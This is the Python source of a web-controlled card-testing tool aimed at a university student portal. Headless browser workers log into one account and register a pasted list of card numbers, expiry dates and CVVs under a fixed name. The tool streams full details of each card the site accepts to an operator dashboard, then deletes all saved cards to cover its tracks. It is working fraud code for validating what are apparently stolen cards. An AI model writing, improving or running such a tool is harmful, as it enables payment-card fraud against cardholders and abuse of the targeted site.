import asyncio
import os
import random
from contextlib import asynccontextmanager
from pathlib import Path

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from playwright.async_api import async_playwright

# ===================== CONFIG =====================
URL_LOGIN = "https://digital.unimar.br/login"
URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"

EMAIL = os.getenv("UNIMAR_EMAIL")
SENHA = os.getenv("UNIMAR_SENHA")
NOME_FIXO = "Bruna Mendes"

# ===================== ESTADO =====================
estado = {
    "rodando": False,
    "clients": set(),
    "total_cartoes": 0,
    "processados": 0,
    "aprovados": 0,
    "fila_vazia": False,
    "tarefas_concluidas": 0
}

def log(mensagem: str):
    print(f"[LOG] {mensagem}")
    asyncio.create_task(broadcast("log", {"mensagem": mensagem}))

async def broadcast(type: str, data: dict = None):
    if data is None:
        data = {}
    message = {"type": type, **data}
    for client in list(estado["clients"]):
        try:
            await client.send_json(message)
        except:
            estado["clients"].discard(client)

# ===================== LIFESPAN =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    Path("aprovados.txt").touch(exist_ok=True)
    yield

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ===================== WEBSOCKET =====================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    estado["clients"].add(websocket)
    try:
        while True:
            await asyncio.sleep(10)
    except WebSocketDisconnect:
        estado["clients"].discard(websocket)

# ===================== FUNÇÕES =====================
async def limpar_cartoes_antigos(page):
    try:
        log("[Faxina] Iniciando limpeza de cartões antigos...")
        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
        await asyncio.sleep(2)

        botoes = page.get_by_role("button", name="Remover")
        total = await botoes.count()

        if total == 0:
            log("[Faxina] Nenhum cartão antigo encontrado.")
            return

        log(f"[Faxina] {total} cartões encontrados. Removendo...")

        for _ in range(total * 3):
            if await botoes.count() == 0:
                break
            await botoes.first.click(force=True)
            await asyncio.sleep(1)
            confirm = page.get_by_role("button", name="Sim").or_(page.get_by_role("button", name="Confirmar"))
            if await confirm.is_visible():
                await confirm.click(force=True)
                await page.wait_for_load_state("networkidle")
                await asyncio.sleep(1.5)

        log("[Faxina] Limpeza concluída!")
    except Exception as e:
        log(f"[Faxina] Erro: {e}")

async def login_mestre(playwright):
    try:
        log("[Autenticação] Iniciando login mestre...")
        browser = await playwright.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context()
        page = await context.new_page()

        await page.goto(URL_LOGIN, wait_until="networkidle", timeout=60000)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(SENHA)
        await page.get_by_role("button", name="Entrar").click()

        await page.wait_for_selector("text=Meus Cartões", timeout=30000)

        # Faxina ANTES dos testes
        await limpar_cartoes_antigos(page)

        await context.storage_state(path="sessao_unimar.json")

        await context.close()
        await browser.close()
        log("[Autenticação] Login e faxina inicial concluídos!")
        return True
    except Exception as e:
        log(f"[ERRO] Login falhou: {e}")
        return False

async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_fluxo: dict, semaforo: asyncio.Semaphore):
    try:
        await asyncio.sleep(id_worker * 2.5)
        log(f"[Canal {id_worker}] Iniciando...")
        context = await browser.new_context(storage_state="sessao_unimar.json")
        page = await context.new_page()
        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")

        while estado["rodando"]:
            try:
                async with semaforo:
                    if fila.empty() and estado["tarefas_concluidas"] >= estado["total_cartoes"]:
                        estado["fila_vazia"] = True
                        log(f"[Canal {id_worker}] Nenhum item na fila e todas as tarefas concluídas")
                        break

                    item = await fila.get()
                    indice, linha, tentativas = item
                    try:
                        numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
                        log(f"[Canal {id_worker}][Item {indice}] Processando: {numero[-4:]}")

                        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
                        await asyncio.sleep(random.uniform(1.0, 2.5))

                        await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)

                        await page.get_by_role("textbox", name="Número do cartão").fill(numero)
                        await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
                        await page.get_by_label("Mês").select_option(mes)
                        await page.get_by_label("Ano").select_option(ano)
                        await page.get_by_role("textbox", name="CVV").fill(cvv)

                        botoes_antes = await page.get_by_role("button", name="Remover").count()
                        await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)

                        for _ in range(30):
                            if not estado["rodando"] or estado["fila_vazia"]:
                                break
                            if await page.get_by_role("button", name="Remover").count() > botoes_antes:
                                log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                                await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                                estado_fluxo["houve_aprovados"] = True
                                estado["aprovados"] += 1
                                break

                            body = (await page.locator("body").inner_text()).lower()
                            if any(x in body for x in ["inválida", "recusado", "erro"]):
                                log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
                                break
                            await asyncio.sleep(1.5)
                    except Exception as e:
                        log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
                    finally:
                        fila.task_done()
                        estado["tarefas_concluidas"] += 1
                        await broadcast("progresso", {
                            "processados": estado["tarefas_concluidas"],
                            "total": estado["total_cartoes"],
                            "aprovados": estado["aprovados"]
                        })
            except Exception as e:
                log(f"[Canal {id_worker}] Erro geral: {e}")
    finally:
        await context.close()
        log(f"[Canal {id_worker}] Finalizado")

async def processar_cartoes(texto_cartoes: str, num_canais: int):
    try:
        linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
        linhas = list(dict.fromkeys(linhas))

        estado["total_cartoes"] = len(linhas)
        estado["processados"] = 0
        estado["aprovados"] = 0
        estado["tarefas_concluidas"] = 0
        estado["fila_vazia"] = False

        if estado["total_cartoes"] == 0:
            log("[ERRO] Nenhum cartão fornecido para teste.")
            return

        # Limitar o número de canais conforme a quantidade de cartões
        num_canais = min(num_canais, estado["total_cartoes"])
        if num_canais < 1:
            num_canais = 1

        log(f"[Sistema] Executando com {num_canais} canais de {estado['total_cartoes']} cartões")

        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))

        async with async_playwright() as pw:
            if not await login_mestre(pw):
                return

            estado_fluxo = {"houve_aprovados": False}
            browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])

            # Usar semáforo para controlar o acesso à fila
            semaforo = asyncio.Semaphore(num_canais)

            # Criar tarefas para os workers
            tasks = [asyncio.create_task(
                worker_contexto(i, browser, fila, estado_fluxo, semaforo)
            ) for i in range(1, num_canais + 1)]

            # Aguardar até que todas as tarefas sejam concluídas
            await asyncio.gather(*tasks, return_exceptions=True)

            # Verificar se a fila está vazia e todas as tarefas foram concluídas
            if fila.empty() and estado["tarefas_concluidas"] >= estado["total_cartoes"]:
                estado["fila_vazia"] = True

            # Faxina FINAL
            if estado_fluxo["houve_aprovados"]:
                log("[Sistema] Iniciando faxina final...")
                try:
                    faxina_context = await browser.new_context(storage_state="sessao_unimar.json")
                    faxina_page = await faxina_context.new_page()
                    await limpar_cartoes_antigos(faxina_page)
                    await faxina_context.close()
                except Exception as e:
                    log(f"[Faxina Final] Erro: {e}")

            await browser.close()

    except Exception as e:
        log(f"[ERRO CRÍTICO] {e}")
    finally:
        estado["rodando"] = False
        log("[Sistema] Processamento concluído")



# ===================== ROTAS =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado["rodando"]:
        return {"status": "já_em_execucao"}
    
    estado["rodando"] = True
    await broadcast("status", {"rodando": True})
    asyncio.create_task(processar_cartoes(data.lista, data.canais))
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    estado["rodando"] = False
    log("⛔ Interrupção solicitada.")
    await broadcast("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("templates/index.html", encoding="utf-8") as f:
        return f.read()

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=5000)
